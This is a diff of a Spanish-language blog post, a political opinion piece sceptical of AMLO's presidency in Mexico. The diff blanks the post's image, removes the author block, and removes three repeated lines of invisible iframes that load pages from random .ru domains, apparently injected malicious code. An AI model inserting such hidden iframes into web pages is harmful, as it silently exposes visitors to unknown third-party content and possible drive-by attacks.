@@ -3,7 +3,7 @@ title: "La victoria en México"
 date: "2018-12-05T15:08:58+00:00"
 author: "Miguel Alejandro Hayes Martínez"
 category: "Política"
-image: "/wp-content/uploads/2018/07/AMLO.png"
+image: ""
 ---
 Todavía recuerdo esa elección donde **AMLO** perdió oscuramente contra Felipe Calderón. Tras tantos años, en un momento donde la izquierda regional va perdiendo espacios de poder frente a derechas, **una nueva esperanza -cargada de especulación y sensacionalismo- rodea la futura gestión del recién electo presidente.**  
 Después de intentar no contaminarme con la avalancha de escritos sobre el tema, me pregunto hasta qué punto toda esa aura que ahora lo rodeo, no será más de lo mismo, de ese espectáculo que se montan los medios alrededor de los políticos. Presiento que esta historia ya yo- y muchos más-la hemos vivido.
@@ -22,21 +22,3 @@ Podría seguir recordando casos, pero creo que está un poco claro. **Hasta ahor
 Creo que esa historia enseña algo. De todos modos **la sabia de Marx es clara: el trabajo se subordina al capital. El capital imperial hoy es cada vez más fuerte.** México es esa nación que como ya se dijo, es digna de lástima, tan cerca de Dios. **No me conformo con las buenas intenciones de un candidato ganador en México. Muchos como él no han podido con el poder al que enfrentaron.** No creo que esta vez, un candidato electo en un sistema de juego burgués vaya a romper la dinámica de los poderosos. **Esa historia ya la viví, no me aferraré al triunfalismo de “se avanzará” solo porque sea de izquierda, porque hace falta mucho más que eso.** Lo que no niega mi mayor deseo de que se logren grandes cosas.
 
 De todos modos, si ese gobierno lograra subvertir ese estado de las cosas tan corrupto y desigual de su país tuviera éxito y lograra cumplir esas promesas, deberíamos replantearnos el papel de la revolución socialista para sustituirlas por fórmulas como esa.
-
-<iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
-
-<iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
-
-<iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
-
-## Autor
-
--   ![](/avatar/e5d4ac9a023b2fcc57340a4d5963fd53?s=80&r=g&d=mm)
-    
-    ![](//www.gravatar.com/avatar/e5d4ac9a023b2fcc57340a4d5963fd53?s=80&r=g&d=mm)
-    
-    [Miguel Alejandro Hayes](https://web.archive.org/web/20221204123508/https://www.trincheracuba.com/author/hayesmartinez/)
-    
-    Editor principal de La Trinchera. Escribo por inspiración
-    
-    [](mailto:hayesmartinez.mrgh@gmail.com)
